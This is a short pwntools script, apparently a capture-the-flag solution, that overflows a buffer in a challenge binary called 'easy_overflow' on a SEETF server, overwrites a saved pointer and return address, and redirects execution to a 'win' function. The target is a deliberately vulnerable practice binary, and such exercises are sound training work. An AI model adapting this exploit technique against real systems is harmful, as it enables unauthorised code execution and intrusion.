from pwn import *

elf = ELF("./easy_overflow")

#p = elf.process()
p = remote("fun.chall.seetf.sg", 50003)
#raw_input("DEBUG")

payload = b"A"*32
payload += p64(0x404038)
payload += p64(0x401212)

p.sendline(payload)

sleep(0.1)

p.sendline(p64(elf.sym.win))

p.interactive()
